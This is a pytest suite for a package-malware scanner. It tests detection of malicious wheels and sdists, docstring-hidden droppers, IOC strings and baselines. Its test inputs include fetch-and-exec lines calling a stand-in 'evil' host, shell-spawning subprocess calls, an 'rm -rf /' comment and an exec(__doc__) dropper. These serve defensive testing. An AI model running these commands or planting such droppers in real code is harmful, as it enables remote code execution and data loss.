"""Regression tests for `scripts/scan_packages.py`, driving the offline
`scan_archive` helper against fixtures under `tests/security/fixtures/`."""

from __future__ import annotations

import hashlib
import os
import re
import subprocess
import sys
from pathlib import Path

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
FIXTURES = Path(__file__).resolve().parent / "fixtures"

sys.path.insert(0, str(REPO_ROOT))
from scripts import scan_packages as sp  # noqa: E402


def test_fixture_files_exist():
    for name in ("malicious_wheel.whl", "clean_wheel.whl", "malicious_sdist.tar.gz"):
        assert (FIXTURES / name).is_file(), name


def test_fixture_bytes_are_deterministic(tmp_path):
    """Re-running `_build.py` must produce byte-identical archives (deterministic builds)."""
    # Snapshot committed hashes.
    expected: dict[str, str] = {}
    for name in ("malicious_wheel.whl", "clean_wheel.whl", "malicious_sdist.tar.gz"):
        expected[name] = hashlib.sha256((FIXTURES / name).read_bytes()).hexdigest()

    # Rebuild into a sibling dir to avoid clobbering the committed files.
    rebuild_dir = tmp_path / "rebuild"
    rebuild_dir.mkdir()
    # The build helper writes to its own dir; copy + patch HERE.
    builder_src = (FIXTURES / "_build.py").read_text()
    rebuilt_helper = rebuild_dir / "_build.py"
    rebuilt_helper.write_text(builder_src)
    # Run with SOURCE_DATE_EPOCH=0 and HERE override via a shim.
    shim = rebuild_dir / "run.py"
    shim.write_text(
        "import sys, pathlib\n"
        f"sys.path.insert(0, {str(rebuild_dir)!r})\n"
        "import _build\n"
        f"_build.HERE = pathlib.Path({str(rebuild_dir)!r})\n"
        "_build.build_all()\n"
    )
    env = dict(os.environ, SOURCE_DATE_EPOCH = "0")
    proc = subprocess.run(
        [sys.executable, str(shim)],
        env = env,
        capture_output = True,
        text = True,
        timeout = 30,
    )
    assert proc.returncode == 0, proc.stderr

    for name, want_sha in expected.items():
        got = hashlib.sha256((rebuild_dir / name).read_bytes()).hexdigest()
        assert got == want_sha, (
            f"rebuild of {name} produced different bytes:\n"
            f"  expected: {want_sha}\n"
            f"  actual:   {got}\n"
            "_build.py is non-deterministic; pin members tighter."
        )


def _critical_or_high(findings) -> list:
    return [f for f in findings if f.severity in (sp.CRITICAL, sp.HIGH)]


def test_malicious_wheel_triggers_critical():
    findings = sp.scan_archive(
        str(FIXTURES / "malicious_wheel.whl"),
        "malicious_fixture",
    )
    assert findings, "no findings on malicious wheel; scanner regression"
    blockers = _critical_or_high(findings)
    assert blockers, f"no CRITICAL/HIGH findings: {[str(f) for f in findings]}"
    assert any("setup.py" in f.filename for f in blockers)


def test_malicious_sdist_triggers_critical():
    findings = sp.scan_archive(
        str(FIXTURES / "malicious_sdist.tar.gz"),
        "malicious_fixture",
    )
    blockers = _critical_or_high(findings)
    assert blockers, f"no CRITICAL/HIGH findings: {[str(f) for f in findings]}"
    assert any("setup.py" in f.filename for f in blockers)


def test_clean_wheel_no_findings():
    findings = sp.scan_archive(
        str(FIXTURES / "clean_wheel.whl"),
        "clean_fixture",
    )
    assert findings == [], f"unexpected findings on clean wheel: {[str(f) for f in findings]}"


# Fork 1 constants -- gated on availability.
_BLOCKED_AVAILABLE = hasattr(sp, "BLOCKED_PYPI_VERSIONS")
_MAY12_AVAILABLE = hasattr(sp, "RE_MAY12_IOC")


@pytest.mark.skipif(
    not _BLOCKED_AVAILABLE,
    reason = "Fork 1 (BLOCKED_PYPI_VERSIONS) not merged yet",
)
def test_blocked_pypi_versions_complete():
    table = sp.BLOCKED_PYPI_VERSIONS
    assert "guardrails-ai" in table
    assert "0.10.1" in table["guardrails-ai"]
    assert "mistralai" in table
    assert "2.4.6" in table["mistralai"]
    assert "lightning" in table
    assert {"2.6.2", "2.6.3"}.issubset(table["lightning"])


@pytest.mark.skipif(
    not _MAY12_AVAILABLE,
    reason = "Fork 1 (RE_MAY12_IOC) not merged yet",
)
def test_re_may12_ioc_catches_each_literal():
    expected_literals = [
        "git-tanstack.com",
        "/tmp/transformers.pyz",
        "transformers.pyz",
        "With Love TeamPCP",
        "We've been online over 2 hours",
    ]
    pattern: re.Pattern = sp.RE_MAY12_IOC
    for lit in expected_literals:
        assert pattern.search(lit), f"RE_MAY12_IOC missed literal {lit!r}"
    # Clean control: a string with none of the literals must not match.
    assert not pattern.search("import numpy as np")


@pytest.mark.skipif(
    not _MAY12_AVAILABLE,
    reason = "Fork 1 (RE_MAY12_IOC integration) not merged yet",
)
def test_may12_ioc_caught_by_scan_archive():
    """Wired into check_py_file, the malicious wheel's setup.py must flag the May-12 IOC string."""
    findings = sp.scan_archive(
        str(FIXTURES / "malicious_wheel.whl"),
        "malicious_fixture",
    )
    # IOC literals built at runtime so CodeQL's url-substring-sanitization rule
    # doesn't false-positive on the `in` operand (it's evidence, not a URL).
    _ioc_host = "git-tanstack." + "com"
    _ioc_drop = "transformers." + "pyz"
    hit = any(
        _ioc_host in (f.evidence or "")
        or _ioc_drop in (f.evidence or "")
        or "may12" in (f.check or "").lower()
        for f in findings
    )
    assert hit, (
        "RE_MAY12_IOC integration missing; findings = "
        f"{[(f.severity, f.check, f.evidence[:80]) for f in findings]}"
    )


# Silent-failure-class hardening (Fork C).


def test_scan_packages_pip_download_failure_propagates(tmp_path):
    """A pip download failure must exit 2 (SCAN INCOMPLETE), not `0 findings, exit 0`.

    Feeds an unresolvable spec; the name is long/random so it can't resolve on any index."""
    script = REPO_ROOT / "scripts" / "scan_packages.py"
    assert script.is_file(), script
    unresolvable = "pkg-that-does-not-exist-0123456789-fork-c-silentfail==0.0.0"
    proc = subprocess.run(
        [sys.executable, str(script), unresolvable],
        cwd = str(tmp_path),
        capture_output = True,
        text = True,
        timeout = 180,
    )
    combined = proc.stdout + proc.stderr
    assert proc.returncode == 2, (
        f"expected exit 2 (download failure -> scan incomplete), got "
        f"{proc.returncode}\n--- stdout ---\n{proc.stdout}\n"
        f"--- stderr ---\n{proc.stderr}"
    )
    assert "SCAN INCOMPLETE" in combined or "pip download failed" in combined


def test_archive_corruption_produces_critical_finding(tmp_path):
    """SF1: a corrupted wheel (once silently skipped) must yield a CRITICAL `archive_corrupted`."""
    bad = tmp_path / "broken-0.0.1-py3-none-any.whl"
    bad.write_bytes(b"X")  # 1-byte "wheel" -- not a valid zip container
    findings = sp.scan_archive(str(bad), "broken_fixture")
    assert findings, "scan_archive returned 0 findings on corrupt wheel"
    corrupted = [f for f in findings if f.check == "archive_corrupted"]
    assert corrupted, (
        "no archive_corrupted finding; got " f"{[(f.severity, f.check) for f in findings]}"
    )
    assert all(f.severity == sp.CRITICAL for f in corrupted)

    # Same for a corrupted tarball.
    bad_tar = tmp_path / "broken-0.0.1.tar.gz"
    bad_tar.write_bytes(b"not-a-real-gzip-stream")
    findings_tar = sp.scan_archive(str(bad_tar), "broken_fixture")
    corrupted_tar = [f for f in findings_tar if f.check == "archive_corrupted"]
    assert corrupted_tar, (
        "no archive_corrupted finding on corrupt tarball; got "
        f"{[(f.severity, f.check) for f in findings_tar]}"
    )


# False-positive hardening: code-only scanning via _strip_noncode.


def test_strip_noncode_blanks_docstrings_and_comments_keeps_geometry():
    src = (
        '"""Module doc mentions subprocess.Popen and reverse shell."""\n'
        "x = 1  # os.system('rm -rf /') in a comment\n"
        "def f():\n"
        "    '''calls eval() and exec() in prose'''\n"
        "    return x\n"
    )
    out = sp._strip_noncode(src)
    # Line geometry is byte-stable so evidence L<n> stays correct.
    assert len(out.splitlines()) == len(src.splitlines())
    # Tokens lived only in docstrings/comments -> gone.
    for needle in ("subprocess", "os.system", "eval(", "exec(", "reverse shell"):
        assert needle not in out, needle
    assert "x = 1" in out
    assert "return x" in out


def test_strip_noncode_preserves_real_code_and_assigned_strings():
    src = (
        "import subprocess\n"
        "subprocess.Popen(['/bin/sh', '-c', 'id'])\n"
        "exec(open('x').read())\n"
        "BLOB = '" + ("A" * 64) + "'\n"  # assigned string is code, not a docstring
    )
    out = sp._strip_noncode(src)
    assert out == src, "real code (incl. RHS string literals) must be untouched"


def test_strip_noncode_falls_back_on_syntax_error():
    broken = "def f(:\n    pass  # not valid python\n"
    # Must not raise; returns the original so the content is still scanned.
    assert sp._strip_noncode(broken) == broken


def test_check_py_file_ignores_docstring_only_iocs():
    # A file whose only dangerous patterns live in a docstring must be clean.
    benign = (
        '"""Usage:\n'
        ">>> import subprocess, urllib.request\n"
        ">>> subprocess.Popen(['sh','-c','id'])\n"
        ">>> exec(urllib.request.urlopen('http://evil/x').read())\n"
        '"""\n'
        "VERSION = '1.0'\n"
    )
    findings = sp.check_py_file(benign, "pkg/_doc.py", "pkg")
    assert findings == [], f"docstring IOCs should not flag: {[str(f) for f in findings]}"
    # The same payload as real code still flags.
    real = (
        "import subprocess, urllib.request\n"
        "subprocess.Popen(['sh','-c','id'])\n"
        "exec(urllib.request.urlopen('http://evil/x').read())\n"
    )
    flagged = sp.check_py_file(real, "pkg/evil.py", "pkg")
    assert any(f.severity in (sp.CRITICAL, sp.HIGH) for f in flagged)


def test_extract_evidence_multiline_reports_line():
    # A cross-line DOTALL match must still yield evidence so the baseline entry is reviewable.
    content = "a = 1\ntime.sleep(\n    600\n)\n"
    ev = sp._extract_evidence(content, sp.RE_ANTI_ANALYSIS)
    assert ev and ev.startswith("L"), ev


def test_anti_analysis_no_longer_flags_cross_platform_code():
    # Pure cross-platform code (the old platform.system false positive) must be clean.
    crossplat = (
        "import platform, subprocess\n"
        "if platform.system() == 'Windows':\n"
        "    subprocess.run(['where', 'git'])\n"
        "else:\n"
        "    subprocess.run(['which', 'git'])\n"
    )
    findings = sp.check_py_file(crossplat, "pkg/_compat.py", "pkg")
    anti = [f for f in findings if "Anti-analysis" in f.check]
    assert anti == [], f"cross-platform code should not be anti-analysis: {anti}"


def test_proc_self_status_read_flags_anti_analysis():
    # Reading /proc/self/status + a subprocess call is the classic anti-debug combo.
    # The old `\b/proc/self/status\b` was unsatisfiable (\b adjacent to "/"); the
    # lookbehind fix makes it fire. No TracerPid/ptrace token, so only /proc signals it.
    payload = (
        "import subprocess\n"
        "with open('/proc/self/status') as fh:\n"
        "    data = fh.read()\n"
        "subprocess.run(['echo', 'go'])\n"
    )
    findings = sp.check_py_file(payload, "pkg/_probe.py", "pkg")
    anti = [f for f in findings if "Anti-analysis" in f.check]
    assert anti, "reading /proc/self/status + subprocess must flag anti-analysis"
    assert anti[0].severity == sp.HIGH


def test_proc_self_status_pattern_is_live():
    # Common call forms; the leading \b made all of these unsatisfiable before the fix.
    for s in (
        'open("/proc/self/status")',
        "cat /proc/self/status",
        "path = '/proc/self/status'",
    ):
        assert sp.RE_ANTI_ANALYSIS.search(s), s
    # A bare cross-platform OS check must still NOT match anti-analysis.
    assert not sp.RE_ANTI_ANALYSIS.search("if platform.system() == 'Linux': pass")


def _mk(sev, pkg, fname, check):
    return sp.Finding(sev, pkg, fname, check, "evidence")


def test_baseline_key_version_stable_but_path_specific():
    a = _mk(sp.CRITICAL, "requests", "requests-2.32.5/requests/sessions.py", "X")
    b = _mk(sp.CRITICAL, "Requests", "requests-3.0.0/requests/sessions.py", "X")
    # Same package-relative path across versions -> same key (stable).
    assert sp._finding_key(a) == sp._finding_key(b)
    # Same basename in a different path -> different key (no over-suppression).
    c = _mk(sp.CRITICAL, "requests", "requests-2.32.5/requests/vendor/sessions.py", "X")
    assert sp._finding_key(a) != sp._finding_key(c)


def test_fstring_statement_is_not_blanked():
    # A bare f-string evaluates at import, so it must stay scannable.
    src = "f\"{__import__('os').system('id')}\"\n"
    assert "__import__" in sp._strip_noncode(src)
    # A plain bare docstring is blanked.
    plain = "'a docstring mentioning subprocess.Popen'\n"
    assert "subprocess" not in sp._strip_noncode(plain)


def test_exec_with_payload_hidden_in_docstring_flagged():
    blob = "A" * 400
    src = '"""' + blob + '"""\nimport os\nexec(__doc__)\n'
    findings = sp.check_py_file(src, "pkg/mod.py", "pkg")
    assert any("hidden in a docstring" in f.check for f in findings)
    # No exec/eval -> the blanked blob produces no such finding.
    src2 = '"""' + blob + '"""\nimport os\n'
    findings2 = sp.check_py_file(src2, "pkg/mod.py", "pkg")
    assert not any("hidden in a docstring" in f.check for f in findings2)


def test_hidden_network_plus_exec_payload_flagged():
    # exec(__doc__) dropper: the docstring (blanked by code-only scanning) holds
    # BOTH a network fetch and an os/shell exec. Neither is a blob, but together
    # they are the payload, so the gate must flag the pair.
    payload = (
        "import urllib.request, os\n"
        "urllib.request.urlopen('http://x/y').read()\n"
        "os.system('sh -c id')\n"
    )
    src = '"""' + payload + '"""\nexec(__doc__)\n'
    findings = sp.check_py_file(src, "pkg/dropper.py", "pkg")
    assert any("hidden network+exec payload" in f.check for f in findings)


def test_real_code_network_and_subprocess_not_hidden_combo():
    # Both calls live in REAL code (covered by the normal checks); the hidden
    # network+exec combo must NOT also fire on them.
    src = (
        "import subprocess, urllib.request\n"
        "def run():\n"
        "    urllib.request.urlopen('http://x').read()\n"
        "    subprocess.Popen(['sh'])\n"
        "exec('1 + 1')\n"
    )
    findings = sp.check_py_file(src, "pkg/real.py", "pkg")
    assert not any("hidden network+exec payload" in f.check for f in findings)


def test_hidden_payload_survives_visible_decoy():
    # A benign visible network call must not mask a docstring payload: the
    # detector inspects the removed (blanked) span, not the whole stripped file.
    payload = (
        "import urllib.request, os\n"
        "urllib.request.urlopen('http://evil/x').read()\n"
        "os.system('sh -c id')\n"
    )
    src = (
        '"""' + payload + '"""\n'
        "import urllib.request\n"
        "urllib.request.urlopen('http://benign/ok')\n"  # visible decoy
        "exec(__doc__)\n"
    )
    findings = sp.check_py_file(src, "pkg/dropper.py", "pkg")
    assert any("hidden network+exec payload" in f.check for f in findings)


def test_comment_only_network_exec_not_flagged():
    # Tokens only in comments are not executable by exec(); the hidden network+exec
    # check inspects strings/docstrings (not comments), so this must stay clean.
    src = (
        "code = 'x = 1'\n"
        "exec(code)\n"
        "# urllib.request.urlopen('http://host/p').read()\n"
        "# subprocess.run(['sh', '-c', 'id'])\n"
    )
    findings = sp.check_py_file(src, "pkg/ex.py", "pkg")
    assert not any("hidden network+exec payload" in f.check for f in findings)


def test_baseline_suppresses_listed_but_not_new_check(tmp_path):
    bl = tmp_path / "bl.json"
    listed = _mk(sp.CRITICAL, "fastapi", "fastapi/routing.py", "C2 polling/beaconing loop detected")
    sp._write_baseline(str(bl), [listed])
    baseline = sp._load_baseline(str(bl))

    # Same (package, basename, check) -> suppressed.
    active, suppressed = sp._partition_baseline([listed], baseline)
    assert suppressed == [listed] and active == []

    # A NEW kind of finding in the SAME file is a different check -> still active.
    new_kind = _mk(
        sp.CRITICAL, "fastapi", "fastapi/routing.py", "Reverse shell / bind shell pattern"
    )
    active2, suppressed2 = sp._partition_baseline([new_kind], baseline)
    assert active2 == [new_kind] and suppressed2 == []


def test_write_baseline_roundtrip_only_crit_high(tmp_path):
    bl = tmp_path / "bl.json"
    findings = [
        _mk(sp.CRITICAL, "p", "a.py", "c1"),
        _mk(sp.HIGH, "p", "b.py", "c2"),
        _mk(sp.MEDIUM, "p", "c.py", "c3"),  # MEDIUM excluded from baseline
    ]
    sp._write_baseline(str(bl), findings)
    keys = sp._load_baseline(str(bl))
    assert sp._finding_key(findings[0]) in keys
    assert sp._finding_key(findings[1]) in keys
    assert sp._finding_key(findings[2]) not in keys


def test_load_baseline_missing_file_is_empty():
    assert sp._load_baseline("/nonexistent/path/bl.json") == set()


# sdist fallback: cover sdist-only packages without building. All offline
# -- PyPI JSON / download are mocked.


class _FakeResp:
    """Minimal urlopen() context-manager stand-in."""

    def __init__(
        self,
        data: bytes = b"",
        status: int = 200,
    ):
        self._data = data
        self.status = status

    def read(self, n: int = -1) -> bytes:
        return self._data

    def __enter__(self):
        return self

    def __exit__(self, *a):
        return False


def _f(packagetype: str, filename: str, url: str) -> dict:
    return {"packagetype": packagetype, "filename": filename, "url": url}


def _meta(
    files: list[dict],
    requires = None,
    version: str = "1.0.0",
) -> dict:
    return {
        "info": {"version": version, "requires_dist": requires or []},
        "urls": files,
        "releases": {version: files},
    }


def test_spec_pin_version():
    assert sp._spec_pin_version("torch==2.3.1") == "2.3.1"
    assert sp._spec_pin_version("torch>=2.0") is None
    assert sp._spec_pin_version("numpy") is None


def test_release_has_wheel_detects_sdist_only():
    sdist_only = _meta([_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x.tar.gz")])
    assert sp._release_has_wheel(sdist_only, None) is False
    assert sp._release_has_wheel(sdist_only, "1.0.0") is False
    has_wheel = _meta(
        [
            _f("sdist", "x.tar.gz", "https://files.pythonhosted.org/x.tar.gz"),
            _f("bdist_wheel", "x.whl", "https://files.pythonhosted.org/x.whl"),
        ]
    )
    assert sp._release_has_wheel(has_wheel, None) is True


def test_is_trusted_pypi_url_only_https_pypi():
    assert sp._is_trusted_pypi_url("https://files.pythonhosted.org/p/x.tar.gz") is True
    assert sp._is_trusted_pypi_url("https://pypi.org/x.tar.gz") is True
    assert sp._is_trusted_pypi_url("http://files.pythonhosted.org/x.tar.gz") is False  # not https
    assert sp._is_trusted_pypi_url("https://evil.example/x.tar.gz") is False
    assert sp._is_trusted_pypi_url("https://files.pythonhosted.org.evil.com/x") is False


def test_requires_dist_skips_extras():
    meta = _meta(
        [],
        requires = [
            "numpy (>=1.20)",
            "torch ; extra == 'dev'",  # optional extra -> skipped
            "pyyaml>=5 ; python_version >= '3.8'",  # non-extra marker -> kept
            "payload>=1 ; extra != 'dev'",  # default-true marker -> kept
        ],
    )
    specs = sp._requires_dist_names(meta)
    # Version constraints are preserved so a pinned dep is fetched, not latest.
    assert "numpy>=1.20" in specs
    assert "pyyaml>=5" in specs
    # A default-true marker that merely mentions ``extra`` is NOT optional.
    assert "payload>=1" in specs
    # The extra-gated dep is skipped entirely (no torch under any form).
    assert not any(sp._extract_pkg_name(s) == "torch" for s in specs)


def test_marker_holds_by_default():
    # Optional only when the extra is the sole gate.
    assert sp._marker_holds_by_default("extra == 'dev'") is False
    assert sp._marker_holds_by_default('extra == "dev"') is False
    # Default-true markers that mention extra must be kept.
    assert sp._marker_holds_by_default("extra != 'dev'") is True
    assert sp._marker_holds_by_default("python_version >= '3.8' or extra == 'dev'") is True
    # No marker / plain env marker -> kept.
    assert sp._marker_holds_by_default("") is True
    # Platform/python markers are kept: the scanner runs on one target but the
    # package may install on another, so these deps must still be scanned.
    assert sp._marker_holds_by_default("sys_platform == 'win32'") is True
    assert sp._marker_holds_by_default("python_version == '3.13'") is True
    assert sp._marker_holds_by_default("sys_platform == 'win32' and extra == 'gpu'") is True


def test_requires_dist_for_fails_closed_on_missing_pin_metadata(monkeypatch):
    # The pinned release's own metadata cannot be fetched -> recover nothing
    # rather than substituting the latest release's (wrong) dependency tree.
    project = _meta([], requires = ["latestdep==9.9.9"])
    monkeypatch.setattr(sp, "_pypi_json", lambda name, version = None: None if version else project)
    assert sp._requires_dist_for("oldpkg", "1.0.0", project) == []


def test_requires_dist_for_uses_pinned_release(monkeypatch):
    # Project-level (latest) metadata declares no malicious dep; the pinned
    # release does. _requires_dist_for must follow the pinned release's tree.
    project = _meta([], requires = ["harmless>=1"])
    pinned = _meta([], requires = ["payload==1.0.0"])
    monkeypatch.setattr(sp, "_pypi_json", lambda name, version = None: pinned if version else project)
    specs = sp._requires_dist_for("oldpkg", "1.0.0", project)
    assert "payload==1.0.0" in specs
    assert "harmless>=1" not in specs


def test_requires_dist_for_records_incomplete_scan_error(monkeypatch):
    # Missing pinned metadata must surface an incomplete-scan error, not a silent
    # [] that a caller cannot tell apart from a genuine no-deps release.
    project = _meta([], requires = ["latestdep==9.9.9"])
    monkeypatch.setattr(sp, "_pypi_json", lambda name, version = None: None if version else project)
    errors: list[str] = []
    assert sp._requires_dist_for("oldpkg", "1.0.0", project, errors) == []
    assert errors and "incomplete" in errors[0]


def test_release_files_pinned_missing_fails_closed():
    # A pin absent from metadata must NOT fall back to the latest artifact.
    meta = _meta(
        [_f("sdist", "x-2.0.0.tar.gz", "https://files.pythonhosted.org/x-2.0.0.tar.gz")],
        version = "2.0.0",
    )
    assert sp._release_files(meta, "9.9.9") == []  # missing pin -> empty, not latest
    assert sp._release_has_wheel(meta, "9.9.9") is False
    assert sp._release_files(meta, "2.0.0")  # present pin still resolves
    assert sp._release_files(meta, None)  # unpinned still uses latest


def test_download_sdist_direct_missing_pin_does_not_scan_latest(tmp_path):
    # Pinned version absent -> no sdist returned (never the latest file).
    meta = _meta(
        [_f("sdist", "x-2.0.0.tar.gz", "https://files.pythonhosted.org/x-2.0.0.tar.gz")],
        version = "2.0.0",
    )
    fpath, err = sp._download_sdist_direct("x", "9.9.9", str(tmp_path), meta = meta)
    assert fpath is None and "no sdist" in err
    assert list(tmp_path.iterdir()) == []


def test_download_sdist_direct_refuses_non_pypi_url(tmp_path):
    meta = _meta([_f("sdist", "x-1.0.0.tar.gz", "https://evil.example/x.tar.gz")])
    fpath, err = sp._download_sdist_direct("x", "1.0.0", str(tmp_path), meta = meta)
    assert fpath is None and "non-PyPI" in err
    assert list(tmp_path.iterdir()) == []  # nothing written


def test_download_sdist_direct_no_sdist_published(tmp_path):
    meta = _meta([_f("bdist_wheel", "x.whl", "https://files.pythonhosted.org/x.whl")])
    fpath, err = sp._download_sdist_direct("x", None, str(tmp_path), meta = meta)
    assert fpath is None and "no sdist" in err


def test_download_sdist_direct_writes_and_preserves_suffix(tmp_path, monkeypatch):
    payload = b"\x1f\x8b" + b"fake-tar-gz-bytes"
    monkeypatch.setattr(sp.urllib.request, "urlopen", lambda req, timeout = 0: _FakeResp(payload))
    meta = _meta(
        [_f("sdist", "langid-1.1.6.tar.gz", "https://files.pythonhosted.org/langid-1.1.6.tar.gz")],
        version = "1.1.6",
    )
    fpath, err = sp._download_sdist_direct("langid", "1.1.6", str(tmp_path), meta = meta)
    assert err is None and fpath is not None
    assert fpath.endswith(".tar.gz")  # suffix preserved -> archive reader picks format
    assert Path(fpath).read_bytes() == payload


def test_download_sdist_direct_size_cap(tmp_path, monkeypatch):
    monkeypatch.setattr(sp, "_MAX_SDIST_BYTES", 8)
    monkeypatch.setattr(sp.urllib.request, "urlopen", lambda req, timeout = 0: _FakeResp(b"x" * 100))
    meta = _meta([_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x.tar.gz")])
    fpath, err = sp._download_sdist_direct("x", "1.0.0", str(tmp_path), meta = meta)
    assert fpath is None and "cap" in err


def test_per_spec_genuine_failure_is_recorded_error(tmp_path, monkeypatch):
    # A spec that fails pip but HAS a wheel on PyPI is a genuine error (-> exit 2).
    class _Proc:
        returncode = 1
        stderr = "ResolutionImpossible"

    monkeypatch.setattr(sp.subprocess, "run", lambda *a, **k: _Proc())
    monkeypatch.setattr(
        sp,
        "_pypi_json",
        lambda name, version = None: _meta(
            [_f("bdist_wheel", "x.whl", "https://files.pythonhosted.org/x.whl")]
        ),
    )
    errors: list[str] = []
    sp._resolve_per_spec_with_deps(["somepkg==1.0.0"], str(tmp_path), {}, errors)
    assert errors and "somepkg" in errors[0]


def test_per_spec_sdist_only_is_not_error(tmp_path, monkeypatch):
    # sdist-only spec: pip fails, PyPI shows no wheel -> direct fetch, no error.
    class _Proc:
        returncode = 1
        stderr = "No matching distribution"

    monkeypatch.setattr(sp.subprocess, "run", lambda *a, **k: _Proc())
    monkeypatch.setattr(
        sp,
        "_pypi_json",
        lambda name, version = None: _meta(
            [_f("sdist", "x-1.0.0.tar.gz", "https://files.pythonhosted.org/x-1.0.0.tar.gz")]
        ),
    )
    monkeypatch.setattr(
        sp.urllib.request, "urlopen", lambda req, timeout = 0: _FakeResp(b"\x1f\x8bdata")
    )
    errors: list[str] = []
    sp._resolve_per_spec_with_deps(["x==1.0.0"], str(tmp_path), {}, errors)
    assert errors == []  # sdist-only handled, not an exit-2 failure
    assert any(p.name.endswith(".tar.gz") for p in tmp_path.iterdir())


# ---------------------------------------------------------------------------
# --fix path: download_packages() returns (results, download_errors); both
# --fix call sites must unpack the tuple, not treat it as the results list.
# ---------------------------------------------------------------------------


def test_find_safe_version_handles_download_tuple(monkeypatch):
    # One downloaded archive, returned as the real (results, download_errors) tuple.
    monkeypatch.setattr(sp, "fetch_pypi_versions", lambda name: ["0.9.0", "1.0.0"])
    monkeypatch.setattr(
        sp,
        "download_packages",
        lambda specs, dest, **kw: ([("foo==0.9.0", "/tmp/foo-0.9.0.whl")], []),
    )
    monkeypatch.setattr(sp, "scan_archive", lambda archive_path, name: [])  # clean
    monkeypatch.setattr(sp.os, "makedirs", lambda *a, **k: None)
    monkeypatch.setattr(sp.os, "remove", lambda *a, **k: None)
    monkeypatch.setattr(sp.shutil, "rmtree", lambda *a, **k: None)

    # bad_ver 1.0.0 -> the only older candidate is 0.9.0, which is clean.
    result = sp.find_safe_version("foo", "1.0.0", "/tmp/ignored", max_search = 10)
    assert result == "0.9.0"


def test_run_fix_uses_first_archive_path(monkeypatch):
    monkeypatch.setattr(
        sp,
        "download_packages",
        lambda specs, dest, **kw: ([("foo", "/tmp/foo-1.2.3.whl")], []),
    )
    seen = {}

    def fake_get_downloaded_version(path):
        seen["path"] = path
        return "1.2.3"

    monkeypatch.setattr(sp, "get_downloaded_version", fake_get_downloaded_version)
    monkeypatch.setattr(sp, "find_safe_version", lambda *a, **k: None)
    monkeypatch.setattr(sp.os, "makedirs", lambda *a, **k: None)
    monkeypatch.setattr(sp.shutil, "rmtree", lambda *a, **k: None)

    # CRITICAL package with no pinned version -> must download to resolve it,
    # reaching downloaded[0][1] (the first archive's path).
    entries = [
        {
            "name": "foo",
            "is_git": False,
            "spec": "foo",
            "source_file": None,
            "raw_line": "foo",
            "line_num": 1,
        }
    ]
    sp._run_fix({"foo"}, entries, max_search = 10)  # must not raise

    assert seen.get("path") == "/tmp/foo-1.2.3.whl"
